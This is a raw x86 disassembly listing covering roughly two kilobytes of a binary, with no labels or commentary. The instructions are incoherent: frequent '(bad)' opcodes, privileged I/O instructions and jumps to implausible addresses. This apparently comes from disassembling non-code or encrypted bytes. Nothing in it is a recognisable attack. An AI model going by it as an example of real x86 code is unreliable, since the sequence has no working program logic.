  41f34f:	or     eax,DWORD PTR [eax-0x3201e08]
  41f355:	icebp  
  41f356:	sub    BYTE PTR [edx+0x752211bd],cl
  41f35c:	mov    cl,bl
  41f35e:	cmp    cl,BYTE PTR [ebp+0x6c4a5b1c]
  41f364:	jg     0x41f351
  41f366:	gs xor eax,0x3b2f5bdf
  41f36c:	pop    eax
  41f36d:	cmp    BYTE PTR [edx+edx*8],ch
  41f370:	mov    ebx,0x1de29a10
  41f375:	(bad)  
  41f376:	mov    esp,0xb5c923c0
  41f37b:	mov    al,0xad
  41f37d:	sub    eax,0xae221720
  41f382:	(bad)  [ecx]
  41f384:	inc    ebx
  41f385:	mov    bl,0x85
  41f387:	and    eax,0x624d8c0e
  41f38c:	out    0x3b,eax
  41f38e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f38f:	(bad)  
  41f390:	(bad)  
  41f391:	jmp    0x41f354
  41f393:	mov    ebp,0xc86d73d1
  41f398:	dec    eax
  41f399:	xor    al,0x95
  41f39b:	sub    DWORD PTR [eax-0x6f],edx
  41f39e:	sub    BYTE PTR [eax+0x489f9e72],al
  41f3a4:	push   0xffffffb3
  41f3a6:	ret    0x2c96
  41f3a9:	fucomi st,st(3)
  41f3ab:	sbb    eax,0xc0931686
  41f3b0:	xchg   cl,al
  41f3b2:	int3   
  41f3b3:	stos   BYTE PTR es:[edi],al
  41f3b4:	mov    ?,WORD PTR [edx+eax*2]
  41f3b7:	push   ecx
  41f3b8:	pop    eax
  41f3b9:	fild   WORD PTR [edi]
  41f3bb:	data16 jle 0x41f342
  41f3be:	sub    DWORD PTR ds:0x5e1b17cc,0x808469c6
  41f3c8:	inc    ebp
  41f3c9:	aas    
  41f3ca:	loop   0x41f3e3
  41f3cc:	nop
  41f3cd:	out    0xa,eax
  41f3cf:	or     dh,BYTE PTR [ebx-0x30]
  41f3d2:	xchg   esp,eax
  41f3d3:	popf   
  41f3d4:	das    
  41f3d5:	stc    
  41f3d6:	xor    edi,ecx
  41f3d8:	adc    al,BYTE PTR [ecx-0x55]
  41f3db:	cmp    al,0x67
  41f3dd:	sbb    al,0xa9
  41f3df:	repz scas al,BYTE PTR es:[edi]
  41f3e1:	imul   ebp,DWORD PTR [esi],0xa5cdca8
  41f3e7:	xchg   esp,eax
  41f3e8:	dec    ecx
  41f3e9:	out    dx,al
  41f3ea:	retf   0x1f72
  41f3ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3ee:	adc    eax,0x715a0e1a
  41f3f3:	int    0x92
  41f3f5:	inc    eax
  41f3f6:	jmp    0x46844329
  41f3fb:	sahf   
  41f3fc:	xor    eax,DWORD PTR [esi-0x37]
  41f3ff:	or     dl,BYTE PTR [esi+ecx*4-0x5bcb7d42]
  41f406:	in     al,0xb7
  41f408:	sbb    al,0x69
  41f40a:	in     eax,dx
  41f40b:	in     eax,dx
  41f40c:	push   ss
  41f40d:	add    al,BYTE PTR ds:0xfcc3fda2
  41f413:	cdq    
  41f414:	mov    esi,0xdbe20b41
  41f419:	push   eax
  41f41a:	jle    0x41f3aa
  41f41c:	cld    
  41f41d:	cld    
  41f41e:	dec    eax
  41f41f:	sti    
  41f420:	adc    al,dl
  41f422:	mov    ds:0x6a283dfe,al
  41f427:	(bad)  
  41f428:	test   ebx,0x2c2015e0
  41f42e:	inc    ecx
  41f42f:	aam    0x3b
  41f431:	clc    
  41f432:	xor    ch,BYTE PTR [edi+0xaa1f1c1]
  41f438:	adc    BYTE PTR [edi],0xbf
  41f43b:	hlt    
  41f43c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f43d:	mov    ebp,0x447f0d28
  41f442:	cmp    esi,ecx
  41f444:	push   ss
  41f445:	mov    DWORD PTR [edi],ebx
  41f447:	stos   DWORD PTR es:[edi],eax
  41f448:	and    bh,bh
  41f44a:	pop    ebp
  41f44b:	sbb    BYTE PTR [esi+0x41],al
  41f44e:	mov    ss,WORD PTR [edx]
  41f450:	mov    WORD PTR [edi+0x55],?
  41f453:	sub    DWORD PTR [ebp-0x5],0x6acfb02d
  41f45a:	push   ss
  41f45b:	addr16 icebp 
  41f45d:	inc    edx
  41f45e:	pop    edi
  41f45f:	or     eax,DWORD PTR [edx+0x190bd3c0]
  41f465:	js     0x41f420
  41f467:	popf   
  41f468:	das    
  41f469:	int3   
  41f46a:	es xchg ebp,eax
  41f46c:	(bad)  
  41f46e:	sbb    BYTE PTR [ecx],ch
  41f470:	div    BYTE PTR [ecx+0x3a10a436]
  41f476:	fdiv   DWORD PTR [edx+0x53]
  41f479:	iret   
  41f47a:	dec    eax
  41f47b:	jnp    0x41f496
  41f47d:	mov    ebx,0x2f397768
  41f482:	jne    0x41f4b8
  41f484:	test   eax,0x6797f71b
  41f489:	clc    
  41f48a:	(bad)  
  41f48b:	sub    ecx,DWORD PTR [esi+0x251b02e]
  41f491:	rol    BYTE PTR [esi+0x6055ad16],0xb4
  41f498:	mov    ebx,0x723ca538
  41f49d:	shl    ebp,0x9a
  41f4a0:	adc    eax,0xaeed7102
  41f4a5:	dec    eax
  41f4a6:	jmp    0xdf9ce7d3
  41f4ab:	cmp    ecx,0x53
  41f4ae:	ss mov edx,0xc23fac00
  41f4b4:	jne    0x41f530
  41f4b6:	mov    ah,BYTE PTR [ebx+0x4f]
  41f4b9:	test   BYTE PTR [ebx-0x7a],ch
  41f4bc:	ret    
  41f4bd:	rol    BYTE PTR [esi-0x1f6653ff],1
  41f4c3:	int3   
  41f4c4:	lahf   
  41f4c5:	mov    ebp,0x38a7044e
  41f4ca:	sub    al,0x45
  41f4cc:	xor    BYTE PTR [edx+0x4a62249b],dl
  41f4d2:	mov    ecx,0xb80e5f09
  41f4d7:	enter  0x7b4b,0xc9
  41f4db:	adc    edx,ebx
  41f4dd:	mov    BYTE PTR [edi-0x69d996b8],cl
  41f4e3:	cmp    DWORD PTR [ecx+esi*1+0x336632a4],edx
  41f4ea:	daa    
  41f4eb:	scas   al,BYTE PTR es:[edi]
  41f4ec:	mov    ecx,0x522a8820
  41f4f1:	push   eax
  41f4f2:	mov    ah,dh
  41f4f4:	dec    edi
  41f4f5:	fs call 0x5ab5e8c2
  41f4fb:	xchg   edx,eax
  41f4fc:	and    BYTE PTR es:[esi+0x24],ch
  41f500:	leave  
  41f501:	data16 sub cl,BYTE PTR [edx+0x898d793]
  41f508:	popa   
  41f509:	or     BYTE PTR [edx],ch
  41f50b:	add    bh,BYTE PTR [edi-0x4082946c]
  41f511:	or     BYTE PTR [esi+0x64],bl
  41f514:	call   0xf7bffdd3
  41f519:	lds    esp,FWORD PTR [edi-0x71]
  41f51c:	fdivp  st(1),st
  41f51e:	test   DWORD PTR [ecx+0x3e],ebx
  41f521:	in     al,0xe3
  41f523:	inc    ebx
  41f524:	adc    eax,0xf2794100
  41f529:	push   0x61
  41f52b:	mov    al,0xfb
  41f52d:	dec    ecx
  41f52e:	adc    eax,0x1ec5bfe9
  41f533:	xchg   edi,eax
  41f534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f535:	lahf   
  41f536:	push   esi
  41f537:	mov    edx,0xc180dd82
  41f53c:	xor    dl,BYTE PTR [ecx-0x65085bc7]
  41f542:	out    dx,eax
  41f543:	jmp    0x41f501
  41f545:	add    cl,cl
  41f547:	adc    eax,0xfccd4208
  41f54c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f54d:	xchg   edx,eax
  41f54e:	out    dx,al
  41f54f:	repnz adc ecx,DWORD PTR [ecx-0x6d19efe7]
  41f556:	pop    edx
  41f557:	push   ss
  41f558:	push   esp
  41f559:	sub    ebx,esp
  41f55b:	xchg   ecx,eax
  41f55c:	dec    edi
  41f55d:	jae    0x41f50c
  41f55f:	ins    DWORD PTR es:[edi],dx
  41f560:	cdq    
  41f561:	sar    al,cl
  41f563:	sbb    al,0x7c
  41f565:	xchg   DWORD PTR [ecx-0x3c],edi
  41f568:	scas   al,BYTE PTR es:[edi]
  41f569:	pop    ds
  41f56a:	icebp  
  41f56b:	cmp    edx,DWORD PTR es:[eax]
  41f56e:	push   esi
  41f56f:	mov    ah,0xbb
  41f571:	xor    eax,0x50ac031
  41f576:	jo     0x41f52c
  41f578:	sahf   
  41f579:	xor    DWORD PTR [edi-0x8c712ea],0xfdac334f
  41f583:	ins    BYTE PTR es:[edi],dx
  41f584:	mov    BYTE PTR fs:[esi+0x67b830c6],bh
  41f58b:	(bad)  
  41f58c:	push   ss
  41f58d:	sbb    edx,DWORD PTR [eax+eiz*4-0x52]
  41f591:	push   0x5a4b093d
  41f596:	lods   eax,DWORD PTR ds:[esi]
  41f597:	lods   al,BYTE PTR ds:[esi]
  41f598:	repnz sti 
  41f59a:	and    DWORD PTR [ecx+0x70],0xdadde987
  41f5a1:	push   es
  41f5a2:	popa   
  41f5a3:	push   eax
  41f5a4:	push   edi
  41f5a5:	stos   DWORD PTR es:[edi],eax
  41f5a6:	retf   
  41f5a7:	mov    ebx,0xe72b5309
  41f5ac:	sahf   
  41f5ad:	loop   0x41f584
  41f5af:	dec    edi
  41f5b0:	adc    edx,DWORD PTR [ebx]
  41f5b2:	sbb    dl,BYTE PTR [ecx+edi*4+0x40]
  41f5b6:	enter  0xf99c,0x91
  41f5ba:	(bad)  
  41f5bb:	in     eax,dx
  41f5bc:	repz sbb eax,0x9c844c33
  41f5c2:	inc    ebp
  41f5c3:	cmp    BYTE PTR [edx+ecx*1+0x2216bb63],cl
  41f5ca:	je     0x41f594
  41f5cc:	(bad)  
  41f5cd:	daa    
  41f5ce:	cmp    DWORD PTR [esi+ebp*1],ebx
  41f5d1:	mov    edx,0x7e9eec02
  41f5d6:	sbb    ecx,DWORD PTR ss:[edi-0x1b]
  41f5da:	jae    0x41f60b
  41f5dc:	rol    DWORD PTR [ebx],1
  41f5de:	xchg   ebp,eax
  41f5df:	jmp    0x410435b1
  41f5e4:	sti    
  41f5e5:	mov    BYTE PTR [edx-0x2414717f],cl
  41f5eb:	stos   BYTE PTR es:[edi],al
  41f5ec:	push   edx
  41f5ed:	jae    0x41f5fe
  41f5ef:	mov    WORD PTR [ecx],cs
  41f5f1:	adc    BYTE PTR [esi-0x47],al
  41f5f4:	int    0x2f
  41f5f6:	hlt    
  41f5f7:	pop    ss
  41f5f8:	test   DWORD PTR [edx-0x297d5d52],ebx
  41f5fe:	cli    
  41f5ff:	push   ecx
  41f600:	add    eax,0x250432a2
  41f605:	std    
  41f606:	jecxz  0x41f61f
  41f608:	int3   
  41f609:	jl     0x41f593
  41f60b:	jecxz  0x41f643
  41f60d:	add    al,0x3f
  41f60f:	ins    DWORD PTR es:[edi],dx
  41f610:	dec    ebp
  41f611:	repnz cld 
  41f613:	xchg   edi,eax
  41f614:	mov    DWORD PTR ds:[edi+0x2a87c7c],0xcdfcd920
  41f61f:	aas    
  41f620:	loop   0x41f655
  41f622:	mov    BYTE PTR [esi+edi*1],al
  41f625:	leave  
  41f626:	fimul  DWORD PTR [ecx]
  41f628:	adc    esp,DWORD PTR [ebx]
  41f62a:	jg     0x41f627
  41f62c:	cmp    DWORD PTR [ecx-0x80],edx
  41f62f:	add    esp,DWORD PTR [edi+0x1d]
  41f632:	(bad)
  41f637:	xor    DWORD PTR [esi-0x4d],esi
  41f63a:	mov    al,0xc5
  41f63c:	dec    eax
  41f63d:	fwait
  41f63e:	add    ch,ah
  41f640:	or     BYTE PTR [edx],ch
  41f642:	xchg   ecx,eax
  41f643:	mov    cl,0xf3
  41f645:	cld    
  41f646:	pop    esp
  41f647:	jae    0x41f653
  41f649:	xchg   ebx,eax
  41f64a:	(bad)  
  41f64b:	jno    0x41f6bb
  41f64d:	pop    ebx
  41f64e:	or     dh,BYTE PTR [ecx-0x7a288876]
  41f654:	ficom  WORD PTR [esi-0x71e2cda7]
  41f65a:	adc    bl,BYTE PTR [esi+0x10]
  41f65d:	out    0xf0,al
  41f65f:	int3   
  41f660:	jge    0x41f627
  41f662:	outs   dx,BYTE PTR ds:[esi]
  41f663:	dec    ebp
  41f664:	push   edx
  41f665:	sub    eax,0x87c65c90
  41f66a:	pushf  
  41f66b:	mov    DWORD PTR [esp+edi*4],esp
  41f66e:	cdq    
  41f66f:	cmp    BYTE PTR [esi],bl
  41f671:	in     al,dx
  41f672:	aam    0xa9
  41f674:	js     0x41f689
  41f676:	dec    ebp
  41f677:	push   cs
  41f678:	mov    ecx,0x42504f33
  41f67d:	xchg   esi,eax
  41f67e:	cdq    
  41f67f:	loop   0x41f695
  41f681:	mov    WORD PTR [eax],?
  41f683:	lock inc esi
  41f685:	mov    ds:0xdbb27204,eax
  41f68a:	jmp    0x2823bb05
  41f68f:	ficom  DWORD PTR [esi+0x1c]
  41f692:	push   esi
  41f693:	push   cs
  41f694:	mov    ds:0x7acb084b,eax
  41f699:	in     eax,dx
  41f69a:	push   ebx
  41f69b:	out    0x96,eax
  41f69d:	jno    0x41f6dd
  41f69f:	div    DWORD PTR [edx+0x78]
  41f6a2:	jle    0x41f6d2
  41f6a4:	nop
  41f6a5:	push   ebx
  41f6a6:	leave  
  41f6a7:	push   es
  41f6a8:	xor    al,0xd7
  41f6aa:	mov    ecx,0x6a24308
  41f6af:	scas   al,BYTE PTR es:[edi]
  41f6b0:	jp     0x41f709
  41f6b2:	and    cl,BYTE PTR [edx+esi*4+0x51]
  41f6b6:	push   0x615d902f
  41f6bb:	add    al,0xa6
  41f6bd:	test   DWORD PTR [edx+0x39],eax
  41f6c0:	mov    edx,0xcc90a891
  41f6c5:	mov    esi,DWORD PTR ds:0x893ae439
  41f6cb:	push   0x64
  41f6cd:	jns    0x41f719
  41f6cf:	mov    bh,0x52
  41f6d1:	mov    edx,0x7b64b77d
  41f6d6:	xchg   esi,eax
  41f6d7:	or     ebx,DWORD PTR [edx-0xd]
  41f6da:	xchg   edi,eax
  41f6db:	add    ch,BYTE PTR [eax-0xf1d4b6b]
  41f6e1:	cmp    al,0xe3
  41f6e3:	ror    DWORD PTR [edi],0x8c
  41f6e6:	stc    
  41f6e7:	push   0x233d12aa
  41f6ec:	or     BYTE PTR [edx+0x45],cl
  41f6ef:	int    0xf4
  41f6f1:	push   ecx
  41f6f2:	adc    DWORD PTR [edx-0x75f6016e],esp
  41f6f8:	sbb    ah,dh
  41f6fa:	jnp    0x41f71d
  41f6fc:	adc    BYTE PTR [eax+0x24],ch
  41f6ff:	and    dh,ah
  41f701:	stos   DWORD PTR es:[edi],eax
  41f702:	daa    
  41f703:	or     eax,0xbdfd3245
  41f708:	fidivr DWORD PTR [edi-0x1bc1da01]
  41f70e:	jecxz  0x41f6d3
  41f710:	inc    ebp
  41f711:	add    BYTE PTR [ebp+0x5e0f9fe7],cl
  41f717:	fstp   DWORD PTR [edi-0x531778f3]
  41f71d:	and    ecx,edx
  41f71f:	and    DWORD PTR [eax],ebx
  41f721:	cmp    DWORD PTR [esi-0x58],0x21f94b5c
  41f728:	jbe    0x41f78c
  41f72a:	push   ebx
  41f72b:	jecxz  0x41f789
  41f72d:	push   edx
  41f72e:	mov    BYTE PTR [esi],0xc
  41f731:	jl     0x41f6f0
  41f733:	cwde   
  41f734:	popa   
  41f735:	mov    al,ds:0x40c338cb
  41f73a:	pop    ss
  41f73b:	inc    BYTE PTR [ecx+eax*2]
  41f73e:	sahf   
  41f73f:	mov    esp,0x493c3021
  41f744:	(bad)  
  41f745:	(bad)  ds:0x21c6608c
  41f74b:	or     al,0x68
  41f74d:	xor    eax,0x712cf398
  41f752:	dec    esi
  41f753:	mov    edx,0xe54caae1
  41f758:	idiv   BYTE PTR [eax-0x24f22c74]
  41f75e:	mov    ecx,0x1011464e
  41f763:	out    dx,al
  41f764:	es xchg ebp,eax
  41f766:	push   ds
  41f767:	fsubr  DWORD PTR [ecx+eax*2]
  41f76a:	xor    edx,0xfe90bbe2
  41f770:	cmc    
  41f771:	push   edx
  41f772:	add    ch,bl
  41f774:	mov    edx,DWORD PTR [esi-0x3d]
  41f777:	xor    BYTE PTR [edx+0x468eeccb],bl
  41f77d:	iret   
  41f77e:	pushf  
  41f77f:	iret   
  41f780:	lods   eax,DWORD PTR ds:[esi]
  41f781:	jg     0x41f786
  41f783:	inc    edi
  41f784:	retf   
  41f785:	retf   
  41f786:	sbb    ah,BYTE PTR [esi+ecx*4-0x67]
  41f78a:	nop
  41f78b:	cmp    DWORD PTR [eax],ecx
  41f78d:	inc    ebp
  41f78e:	xor    al,0xb4
  41f790:	xor    eax,DWORD PTR [edi]
  41f792:	and    al,BYTE PTR [eax+0x31]
  41f795:	jae    0x41f728
  41f797:	dec    eax
  41f798:	adc    DWORD PTR [esi-0x7e],ecx
  41f79b:	repz pusha 
  41f79d:	ins    BYTE PTR es:[edi],dx
  41f79e:	in     al,0xc6
  41f7a0:	cmp    dh,BYTE PTR [eax-0x73]
  41f7a3:	loopne 0x41f736
  41f7a5:	sti    
  41f7a6:	or     esp,ebx
  41f7a8:	pop    cx
  41f7aa:	cs or  al,0x1
  41f7ad:	fwait
  41f7ae:	stos   DWORD PTR es:[edi],eax
  41f7af:	out    dx,eax
  41f7b0:	call   0x35c8:0xf25a2e0a
  41f7b7:	mov    esp,0x5e411a20
  41f7bc:	test   al,0x7c
  41f7be:	frstor [ebx+edi*2]
  41f7c1:	das    
  41f7c2:	ret    
  41f7c3:	clc    
  41f7c4:	test   DWORD PTR [edx-0x41facee4],esi
  41f7ca:	push   esi
  41f7cb:	push   cs
  41f7cc:	xchg   ecx,eax
  41f7cd:	mov    eax,ds:0x8987c88b
  41f7d2:	jno    0x41f837
  41f7d4:	push   ss
  41f7d5:	adc    al,0xf2
  41f7d7:	pop    eax
  41f7d8:	mov    edi,0x9512146c
  41f7dd:	jb     0x41f780
  41f7df:	loopne 0x41f828
  41f7e1:	push   eax
  41f7e2:	sub    BYTE PTR [ecx+0x58],al
  41f7e5:	(bad)  
  41f7e6:	loope  0x41f7a5
  41f7e8:	inc    edx
  41f7e9:	dec    ebp
  41f7ea:	xor    edi,DWORD PTR [edi+0x2480846f]
  41f7f0:	cmp    cl,cl
  41f7f2:	mov    edx,0x33ec22a7
  41f7f7:	sub    eax,0xb3eefc18
  41f7fc:	iret   
  41f7fd:	sbb    eax,0xac9fadfc
  41f802:	std    
  41f803:	xchg   ebx,eax
  41f804:	cmp    esp,esp
  41f806:	std    
  41f807:	aas    
  41f808:	ds mov ah,0x4c
  41f80b:	shl    BYTE PTR [edi],0x7f
  41f80e:	icebp  
  41f80f:	ror    DWORD PTR [ebx+0x3e37f1de],cl
  41f815:	jmp    0x41f864
  41f817:	cmp    BYTE PTR [eax+0x50],dl
  41f81a:	pusha  
  41f81b:	scas   eax,DWORD PTR es:[edi]
  41f81c:	push   0x426b4082
  41f821:	icebp  
  41f822:	call   0xc3a30d02
  41f827:	and    al,0x6e
  41f829:	test   al,0xcb
  41f82b:	cmp    dl,dh
  41f82d:	dec    esp
  41f82e:	stc    
  41f82f:	sub    eax,0x8b82d360
  41f834:	(bad)  
  41f835:	or     al,0x18
  41f837:	or     al,0xf4
  41f839:	out    0x83,eax
  41f83b:	sbb    BYTE PTR [ebx-0x4],bl
  41f83e:	and    esp,esi
  41f840:	sub    eax,0xc83fa45a
  41f845:	arpl   WORD PTR [esi-0x473ca376],si
  41f84b:	jge    0x41f84d
  41f84d:	(bad)  
  41f84e:	into   
  41f84f:	adc    al,0xbf
  41f851:	test   ah,dl
  41f853:	add    ecx,DWORD PTR [eax]
  41f855:	inc    esp
  41f856:	test   ecx,0x78408851
  41f85c:	pop    ebx
  41f85d:	iret   
  41f85e:	mov    al,ds:0x5e2c3872
  41f863:	gs aaa 
  41f865:	je     0x41f8cf
  41f867:	arpl   dx,bx
  41f869:	out    0x3a,al
  41f86b:	test   eax,0x11e54332
  41f870:	or     cl,al
  41f872:	(bad)  
  41f874:	sub    eax,0x2b8eb172
  41f879:	inc    edi
  41f87a:	mov    bl,0xa
  41f87c:	push   ebx
  41f87d:	(bad)  
  41f87e:	in     al,0xb6
  41f880:	jbe    0x41f8cc
  41f882:	cs xor al,0x3c
  41f885:	fild   WORD PTR [eax+0x5d]
  41f888:	pushf  
  41f889:	icebp  
  41f88a:	cdq    
  41f88b:	xlat   BYTE PTR ds:[ebx]
  41f88c:	sti    
  41f88d:	scas   al,BYTE PTR es:[edi]
  41f88e:	xor    DWORD PTR [ebx+0x338b01dc],ebp
  41f894:	jle    0x41f847
  41f896:	out    dx,eax
  41f897:	ins    DWORD PTR es:[edi],dx
  41f898:	(bad)  
  41f899:	lahf   
  41f89a:	(bad)  
  41f89b:	mov    BYTE PTR [esi-0x49],dh
  41f89e:	adc    BYTE PTR [edx-0x1b],0xf3
  41f8a2:	in     al,dx
  41f8a3:	push   0x7e
  41f8a5:	pop    ss
  41f8a6:	adc    DWORD PTR ds:0xf333984e,esp
  41f8ac:	inc    eax
  41f8ad:	cmp    DWORD PTR [ecx+0x8],edx
  41f8b0:	int3   
  41f8b1:	mov    bl,0x94
  41f8b3:	mov    DWORD PTR [ebx+0x38e39e67],edi
  41f8b9:	dec    esp
  41f8ba:	jae    0x41f8fd
  41f8bc:	fwait
  41f8bd:	inc    edx
  41f8be:	sahf   
  41f8bf:	xchg   edx,eax
  41f8c0:	stos   DWORD PTR es:[edi],eax
  41f8c1:	repnz sti 
  41f8c3:	mov    DWORD PTR [eax-0x6c],eax
  41f8c6:	mov    ecx,0xfbf4142f
  41f8cb:	pop    ss
  41f8cc:	sbb    al,0xff
  41f8ce:	push   eax
  41f8cf:	lods   eax,DWORD PTR ds:[esi]
  41f8d0:	or     dl,ch
  41f8d2:	cmp    dl,BYTE PTR [esi-0x20]
  41f8d5:	stc    
  41f8d6:	sar    BYTE PTR [ebp-0x38],cl
  41f8d9:	adc    edx,ebx
  41f8db:	test   eax,0x2a0fde9
  41f8e0:	ret    
  41f8e1:	rcr    BYTE PTR [esi+0x5e81e8d1],1
  41f8e7:	das    
  41f8e8:	mov    ebx,0x1483bea6
  41f8ed:	add    DWORD PTR [edi],ebp
  41f8ef:	jne    0x41f901
  41f8f1:	mov    ds:0xf4ff410f,eax
  41f8f6:	bound  ebx,QWORD PTR [esp+ebx*1-0x1]
  41f8fa:	ds loopne 0x41f8d4
  41f8fd:	clc    
  41f8fe:	nop
  41f8ff:	mov    cs,WORD PTR [edi]
  41f901:	dec    ebp
  41f902:	add    BYTE PTR [ebx+ecx*8],dl
  41f905:	rcr    DWORD PTR [edi-0x654dcbd1],cl
  41f90b:	sbb    ecx,edx
  41f90d:	adc    eax,DWORD PTR [esi]
  41f90f:	push   edi
  41f910:	and    DWORD PTR [eax+0x7c],esp
  41f913:	add    edx,ecx
  41f915:	and    DWORD PTR [esi],edx
  41f917:	jmp    0x41f8a5
  41f919:	xor    edi,esp
  41f91b:	cli    
  41f91c:	mov    esi,0xf0854103
  41f921:	xor    edx,eax
  41f923:	inc    esp
  41f924:	int3   
  41f925:	push   es
  41f926:	arpl   bx,di
  41f928:	xchg   edi,eax
  41f929:	dec    ebx
  41f92a:	pop    eax
  41f92b:	clc    
  41f92c:	outs   dx,BYTE PTR ds:[esi]
  41f92d:	jmp    0x7997cd65
  41f932:	ret    0x2d8
  41f935:	pop    ss
  41f936:	sti    
  41f937:	add    ebp,DWORD PTR [eax]
  41f939:	jnp    0x41f8d5
  41f93b:	shl    BYTE PTR [edi+ecx*4],0xdc
  41f93f:	xchg   BYTE PTR [esi-0x371b234e],al
  41f945:	xor    cl,BYTE PTR [ebp+0x20]
  41f948:	xchg   edx,eax
  41f949:	stos   BYTE PTR es:[edi],al
  41f94a:	sub    bl,BYTE PTR [esi]
  41f94c:	arpl   WORD PTR [ecx],bx
  41f94e:	mov    bl,0xad
  41f950:	add    al,0x76
  41f952:	dec    ebp
  41f953:	sbb    al,0x47
  41f955:	arpl   WORD PTR [ecx-0x6909b58d],cx
  41f95b:	retf   
  41f95c:	xchg   edx,eax
  41f95d:	sbb    al,0xd5
  41f95f:	mov    bh,dl
  41f961:	fbstp  TBYTE PTR [edx]
  41f963:	mov    edx,0x76c00144
  41f968:	sub    al,0xca
  41f96a:	enter  0xafa1,0x9b
  41f96e:	mov    eax,0x10b54c33
  41f973:	xchg   edx,eax
  41f974:	or     DWORD PTR ds:[edx-0x4186756a],edx
  41f97b:	sbb    ebp,DWORD PTR [ebx-0x6d9f18e9]
  41f981:	imul   eax,DWORD PTR [edx],0x9348e615
  41f987:	pushf  
  41f988:	popa   
  41f989:	push   eax
  41f98a:	cmp    DWORD PTR [esi+edx*1+0x848dfc7],esi
  41f991:	xchg   ecx,eax
  41f992:	pop    esp
  41f993:	push   0x8b8326b8
  41f998:	sub    ch,BYTE PTR [esp+esi*8]
  41f99b:	xchg   ebp,eax
  41f99c:	addr16 retf 0xcb7a
  41f9a0:	sbb    BYTE PTR [di],cl
  41f9a3:	out    dx,al
  41f9a4:	out    0x8e,eax
  41f9a6:	push   edi
  41f9a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9a8:	je     0x41f954
  41f9aa:	scas   eax,DWORD PTR es:[edi]
  41f9ab:	test   BYTE PTR [ebx+0x5],dh
  41f9ae:	adc    eax,0x72051cd9
  41f9b3:	inc    ecx
  41f9b4:	loopne 0x41f9cf
  41f9b6:	pop    edx
  41f9b7:	push   eax
  41f9b8:	xor    dl,dl
  41f9ba:	in     eax,dx
  41f9bb:	daa    
  41f9bc:	push   ebp
  41f9bd:	jns    0x41f9e1
  41f9bf:	xchg   ebp,eax
  41f9c0:	cmp    BYTE PTR [eax+0x65],ch
  41f9c3:	cwde   
  41f9c4:	(bad)  
  41f9c5:	inc    ecx
  41f9c6:	in     al,dx
  41f9c7:	jmp    0x8802ea5e
  41f9cc:	ficomp DWORD PTR [eax+0x2389fad6]
  41f9d2:	adc    al,0x43
  41f9d4:	inc    edi
  41f9d5:	xor    BYTE PTR [esi+0x40],ah
  41f9d8:	pop    eax
  41f9d9:	jno    0x41f9c1
  41f9db:	push   edx
  41f9dc:	outs   dx,BYTE PTR ds:[esi]
  41f9dd:	data16 rcl BYTE PTR es:[edi],0x53
  41f9e2:	iret   
  41f9e3:	rcr    BYTE PTR [eax-0x78a4b95c],1
  41f9e9:	sub    esp,esp
  41f9eb:	mov    eax,ds:0xf9fe0552
  41f9f0:	test   BYTE PTR [edi-0x7ff5de0d],0xf
  41f9f7:	int    0x4
  41f9f9:	or     BYTE PTR [esi],al
  41f9fb:	pop    es
  41f9fc:	pop    edi
  41f9fd:	hlt    
  41f9fe:	mov    ds:0xd69bdad4,eax
  41fa03:	outs   dx,BYTE PTR ds:[esi]
  41fa04:	or     esi,DWORD PTR [eax-0x5b09db75]
  41fa0a:	mov    ebx,0x5e4da839
  41fa0f:	adc    DWORD PTR [ecx+0xbbfe7ec],ebp
  41fa15:	or     al,0x16
  41fa17:	cmp    BYTE PTR [ecx+0x13],ch
  41fa1a:	jb     0x41fa98
  41fa1c:	or     eax,0x7b5f22d5
  41fa21:	jns    0x41f9ae
  41fa23:	test   esp,ebx
  41fa25:	das    
  41fa26:	push   eax
  41fa27:	sub    ch,BYTE PTR [eax-0x17]
  41fa2a:	pop    ds
  41fa2b:	sbb    DWORD PTR [ebx+0x30],ebx
  41fa2e:	repnz mov ch,0x2f
  41fa31:	mov    al,ds:0x49dbd3d7
  41fa36:	mov    edi,esi
  41fa38:	ja     0x41fa22
  41fa3a:	cmp    BYTE PTR [esi+0x2178ff6c],bh
  41fa40:	mov    dl,ah
  41fa42:	fdivr  DWORD PTR [edi+0x8a5c1a2]
  41fa48:	lds    ecx,FWORD PTR [edi+ebx*2+0x324795ca]
  41fa4f:	call   0x9a8dba24
  41fa54:	mov    al,0x40
  41fa56:	arpl   WORD PTR [ebx-0x5c],di
  41fa59:	mov    ecx,0x7cd92bcd
  41fa5e:	es popa 
  41fa60:	iret   
  41fa61:	xchg   bl,al
  41fa63:	add    al,0xd
  41fa65:	fsincos 
  41fa67:	xchg   edx,eax
  41fa68:	xor    eax,DWORD PTR [ecx-0x39125755]
  41fa6e:	xchg   ebp,eax
  41fa6f:	xchg   BYTE PTR [ecx],cl
  41fa71:	in     eax,dx
  41fa72:	mov    esi,0x4680c207
  41fa77:	sub    dl,bl
  41fa79:	sub    al,0xc4
  41fa7b:	sub    al,0x17
  41fa7d:	sub    BYTE PTR [eax+0x611b19a3],dl
  41fa83:	adc    al,bh
  41fa85:	out    dx,al
  41fa86:	clc    
  41fa87:	popa   
  41fa88:	in     al,dx
  41fa89:	ret    
  41fa8a:	pushf  
  41fa8b:	jmp    ebp
  41fa8d:	pop    esi
  41fa8e:	scas   al,BYTE PTR es:[edi]
  41fa8f:	sub    DWORD PTR [eax+0x5],esp
  41fa92:	pop    es
  41fa93:	mov    WORD PTR [edx],cs
  41fa95:	xchg   ecx,eax
  41fa96:	in     al,dx
  41fa97:	xchg   ebp,eax
  41fa98:	jne    0x41fa8d
  41fa9a:	repz repz pop esp
  41fa9d:	out    0xa6,eax
  41fa9f:	cmc    
  41faa0:	test   eax,edi
  41faa2:	push   cs
  41faa3:	pop    edx
  41faa4:	jb     0x41faf6
  41faa6:	mov    esi,DWORD PTR [edx+0x4]
  41faa9:	mov    eax,?
  41faab:	gs adc al,0x18
  41faae:	mov    eax,ds:0xe46d846d
  41fab3:	jmp    0x41faf2
  41fab5:	add    ebx,ecx
  41fab7:	add    eax,0x67517ff3
  41fabc:	or     BYTE PTR [esi-0x36],dl
  41fabf:	push   eax
  41fac0:	sbb    eax,0xa6d102d7
  41fac5:	add    ebx,edi
  41fac7:	pop    edx
  41fac8:	mov    ebx,0xb61a11fb
  41facd:	xchg   edi,eax
  41face:	lea    esp,[esi+0xf]
  41fad1:	or     eax,0xddef9a5d
  41fad6:	jns    0x41fa88
